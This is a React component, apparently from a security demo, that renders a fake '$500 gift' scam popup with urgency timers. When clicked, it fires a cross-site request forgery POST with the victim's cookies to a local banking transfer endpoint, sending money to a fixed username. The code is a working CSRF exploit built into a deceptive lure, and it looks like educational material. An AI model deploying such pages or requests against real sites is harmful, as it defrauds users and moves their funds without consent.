import React, { useState, useEffect } from 'react';

const AttackerPage = ({ onBack }) => {
  // Page states: 'popup1' -> 'popup2' -> 'success'
  const [currentPage, setCurrentPage] = useState('popup1');
  const [timeLeft, setTimeLeft] = useState(9 * 60 + 39); // 9 minutes 39 seconds

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prevTime => {
        if (prevTime > 0) {
          return prevTime - 1;
        } else {
          return 9 * 60 + 39; // Reset timer
        }
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // First popup - opens second popup
  const handleClaimNowPopup1 = () => {
    setCurrentPage('popup2');
  };

  // Second popup - executes CSRF attack and shows success
  const handleClaimNowPopup2 = async () => {
    try {
      // Execute CSRF attack using fetch
      // The browser automatically includes the victim's session cookie
      // Backend extracts the user ID from the session cookie (req.session.userId)
      const response = await fetch('http://localhost:5000/api/transfer', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        credentials: 'include', // This sends the victim's session cookie automatically
        body: JSON.stringify({
          // No fromUserId needed - backend gets it from session cookie
          toUsername: 'ycp27',
          amount: 100,
          description: 'Gift voucher claim'
        })
      });

      const data = await response.json();
      setCurrentPage('success');
    } catch (error) {
      setCurrentPage('success');
    }
  };

  const floatingShapes = [
    { type: 'diamond', style: { top: '10%', left: '5%', animationDelay: '0s' } },
    { type: 'circle', style: { top: '20%', right: '8%', animationDelay: '0.5s' } },
    { type: 'square', style: { top: '50%', left: '3%', animationDelay: '1s' } },
    { type: 'diamond', style: { bottom: '15%', right: '5%', animationDelay: '1.5s' } },
    { type: 'circle', style: { bottom: '30%', left: '8%', animationDelay: '2s' } },
    { type: 'triangle', style: { top: '60%', right: '10%', animationDelay: '2.5s' } },
  ];

  const getShapeClasses = (type) => {
    const baseClasses = "absolute opacity-60";
    switch (type) {
      case 'diamond':
        return `${baseClasses} w-5 h-5 bg-green-500 transform rotate-45`;
      case 'circle':
        return `${baseClasses} w-5 h-5 bg-blue-500 rounded-full`;
      case 'square':
        return `${baseClasses} w-5 h-5 bg-yellow-500`;
      case 'triangle':
        return `${baseClasses} w-0 h-0 border-l-[10px] border-r-[10px] border-l-transparent border-r-transparent border-b-[20px] border-b-pink-500`;
      default:
        return baseClasses;
    }
  };

  // Render the appropriate page based on current state
  const renderPage = () => {
    switch (currentPage) {
      case 'popup1':
        return renderPopup1();
      case 'popup2':
        return renderPopup2();
      case 'success':
        return renderSuccessPage();
      default:
        return renderPopup1();
    }
  };

  // First Popup Page (Image 2)
  const renderPopup1 = () => (
    <div className="fixed inset-0 bg-gray-900/20 backdrop-blur-[2px] flex items-center justify-center z-50">
      <div className="relative bg-white rounded-2xl shadow-2xl max-w-sm w-full mx-4 overflow-hidden">
        {/* Close Button */}
        <button
          onClick={onBack}
          className="absolute top-3 right-3 z-10 transition duration-300 text-gray-600"
        >
          ✕
        </button>
        
        {/* Popup Content */}
        <div className="bg-linear-to-b from-purple-500 via-pink-500 to-orange-500 text-white p-6 text-center">
          {/* Trophy Icon */}
          <div className="mb-4">
            <div className="bg-white rounded-full p-3 inline-block">
              <span className="text-5xl">🎁</span>
            </div>
          </div>
          
          <h2 className="text-xl font-bold mb-3">🎉 CONGRATULATIONS! 🎉</h2>
          <p className="text-sm mb-1">You've been selected as our</p>
          <p className="text-lg font-bold mb-4 text-yellow-200">LUCKY WINNER!</p>
          
          {/* Gift Package */}
          <div className="bg-white rounded-xl p-4 mb-4 text-gray-800">
            <div className="flex items-center justify-center mb-2">
              <span className="text-2xl mr-2">🎁</span>
              <div className="text-left">
                <h3 className="text-lg font-bold text-purple-600">
                  Premium Gift Package
                </h3>
                <p className="text-sm text-gray-600">Worth $500 - Claim now!</p>
              </div>
            </div>
          </div>
          
          {/* Countdown Timer */}
          <div className="bg-white bg-opacity-20 rounded-lg p-3 mb-4">
            <div className="flex items-center justify-center space-x-1 text-gray-600">
              <span className="text-sm">⏰</span>
              <span className="text-sm font-medium">Offer expires in:</span>
            </div>
            <div className="text-2xl font-bold text-gray-600 mt-1">
              {formatTime(timeLeft)}
            </div>
            <p className="text-xs text-gray-600 mt-1">Limited time only!</p>
          </div>
          
          {/* CTA Button */}
          <button
            onClick={handleClaimNowPopup1}
            className="w-full bg-white text-purple-600 py-3 px-6 rounded-xl font-bold text-lg hover:bg-gray-100 transition duration-300 shadow-lg transform hover:scale-105"
          >
            🎉 CLAIM NOW! 👉
          </button>
          
          {/* Trust Indicators */}
          <div className="mt-3 text-xs text-yellow-200 opacity-90">
            <p>✅ No fees • ✅ Instant • ✅ Limited</p>
          </div>
        </div>
      </div>
    </div>
  );

  // Second Popup Page (Image 3)
  const renderPopup2 = () => (
    <div className="fixed inset-0 bg-gray-900/20 backdrop-blur-[2px] flex items-center justify-center z-50">
      <div className="bg-white rounded-lg p-8 max-w-md w-full mx-4 relative shadow-2xl">
        <button
          onClick={onBack}
          className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 text-xl font-bold"
        >
          ×
        </button>
        
        <div className="text-center">
          <h2 className="text-2xl font-bold text-green-600 mb-4">🎉 Congratulations! 🎉</h2>
          <p className="text-gray-700 mb-4">
            You've won an exclusive gift package! Click below to claim your reward on our partner site.
          </p>
          
          <div className="bg-linear-to-r from-purple-500 to-pink-500 text-white p-4 rounded-lg mb-4">
            <h3 className="font-bold text-lg">Premium Gift Package</h3>
            <p className="text-sm opacity-90">Worth $500 - Limited time offer!</p>
          </div>
          
          <button
            onClick={handleClaimNowPopup2}
            className="w-full bg-linear-to-r from-green-500 to-blue-500 text-white py-3 px-6 rounded-lg font-bold text-lg hover:opacity-90 transition duration-300"
          >
            🎁 CLAIM YOUR GIFT NOW! 🎁
          </button>
          
          <p className="text-xs text-gray-500 mt-3">
            * This offer is provided by our trusted partner
          </p>
        </div>
      </div>
    </div>
  );

  // Success Page (Image 4)
  const renderSuccessPage = () => (
    <div className="fixed inset-0 bg-gray-900/20 backdrop-blur-[2px] flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg max-w-md w-full max-h-[90vh] overflow-y-auto relative shadow-2xl">
        <div className="sticky top-0 bg-white rounded-t-lg p-4 border-b border-gray-100 z-10">
          <button
            onClick={onBack}
            className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 text-xl font-bold"
          >
            ×
          </button>
        </div>
        
        <div className="p-8 text-center">
          {/* Celebration Icon */}
          <div className="mb-6">
            <div className="text-6xl mb-4">🎉</div>
          </div>
          
          <h2 className="text-3xl font-bold text-green-600 mb-4">Success!</h2>
          <p className="text-gray-700 mb-6">
            Your gift claim has been processed successfully!
          </p>
          
          {/* Gift Status Box */}
          <div className="bg-linear-to-r from-green-500 to-green-600 text-white p-6 rounded-2xl mb-6">
            <div className="flex items-center justify-center mb-2">
              <span className="text-2xl mr-2">✅</span>
              <span className="text-2xl mr-2">🎁</span>
            </div>
            <h3 className="font-bold text-xl mb-1">Gift Claimed!</h3>
            <p className="text-sm opacity-90">Your Premium Gift Package is being prepared for delivery.</p>
          </div>
          
          {/* Confirmation Details */}
          <div className="bg-green-50 border-2 border-dashed border-green-400 rounded-xl p-4 mb-6">
            <div className="text-green-800 text-sm mb-2 flex items-center justify-center">
              <span className="mr-2">📧</span>
              <span className="font-semibold">Confirmation Details</span>
            </div>
            <div className="text-green-700 text-xs space-y-1">
              <p className="flex items-center justify-center">
                <span className="mr-2">✅</span>
                Gift Package: Premium ($500 value)
              </p>
              <p className="flex items-center justify-center">
                <span className="mr-2">✅</span>
                Processing: Complete
              </p>
              <p className="flex items-center justify-center">
                <span className="mr-2">✅</span>
                Delivery: 2-3 business days
              </p>
            </div>
          </div>
          
          {/* Action Buttons */}
          <div className="space-y-3">
            <button
              onClick={onBack}
              className="w-full bg-blue-600 text-white py-3 px-6 rounded-full font-bold text-lg hover:bg-blue-700 transition duration-300"
            >
              🏦 Return to Banking
            </button>
            
            <button
              onClick={() => setCurrentPage('popup2')}
              className="w-full bg-gray-500 text-white py-2 px-4 rounded-full text-sm hover:bg-gray-600 transition duration-300"
            >
              ← Back to Gift Page
            </button>
          </div>
          
          {/* Footer Messages */}
          <div className="mt-4 text-xs text-gray-500 space-y-1">
            <p className="flex items-center justify-center">
              <span className="mr-1">📧</span>
              Confirmation email has been sent to your registered address
            </p>
            <p className="flex items-center justify-center">
              <span className="mr-1">🔒</span>
              This transaction is secured and verified
            </p>
          </div>
          
          {/* Additional Details for Scrolling */}
          <div className="mt-6 bg-gray-50 rounded-xl p-4">
            <h4 className="font-semibold text-gray-800 mb-2">📋 What's Next?</h4>
            <div className="text-xs text-gray-600 space-y-1 text-left">
              <p>• You will receive a tracking number via email within 24 hours</p>
              <p>• Our premium shipping partner will handle delivery</p>
              <p>• Package contents include exclusive branded merchandise</p>
              <p>• Customer support available 24/7 for any questions</p>
              <p>• Satisfaction guaranteed or full refund within 30 days</p>
            </div>
          </div>
          
          <div className="mt-4 bg-blue-50 rounded-xl p-4">
            <h4 className="font-semibold text-blue-800 mb-2">🎁 Gift Package Contents</h4>
            <div className="text-xs text-blue-600 space-y-1 text-left">
              <p>• Premium branded merchandise worth $200</p>
              <p>• Digital voucher for online shopping - $150</p>
              <p>• Exclusive membership benefits - $100</p>
              <p>• Gift card for partner restaurants - $50</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  return (
    <>
      <style>
        {`
          @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(10deg); }
          }
          .animate-float {
            animation: float 3s ease-in-out infinite;
          }
          @keyframes bounce-custom {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
          }
          .animate-bounce-custom {
            animation: bounce-custom 1s ease-in-out infinite;
          }
          @keyframes sparkle {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
          }
          .animate-sparkle {
            animation: sparkle 1.5s ease-in-out infinite;
          }
        `}
      </style>
      {renderPage()}
    </>
  );
};

export default AttackerPage;